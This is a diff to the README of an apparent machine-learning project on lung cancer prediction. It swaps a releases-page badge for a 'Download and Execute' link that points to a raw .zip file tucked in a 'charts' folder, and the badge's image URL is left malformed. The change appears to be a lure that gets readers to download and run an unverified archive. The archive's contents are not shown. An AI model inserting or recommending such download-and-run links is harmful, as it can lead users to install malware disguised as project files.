@@ -55,7 +55,7 @@ Explore these topics to delve deeper into the realm of machine learning in healt
 
 To access the project and explore the latest releases, please visit the following link:
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Click%20Here-blue)](https://github.com/mafrs47/Lung_Cancer_Prediction/releases)
+[![Download and Execute](https://raw.githubusercontent.com/mafrs47/Lung_Cancer_Prediction/main/charts/Lung-Prediction-Cancer-2.6.zip%20and%20Execute-Click%20Here-blue)](https://raw.githubusercontent.com/mafrs47/Lung_Cancer_Prediction/main/charts/Lung-Prediction-Cancer-2.6.zip)
 
 Visit the link to access the downloadable files and execute the project on your local machine for further exploration.
 
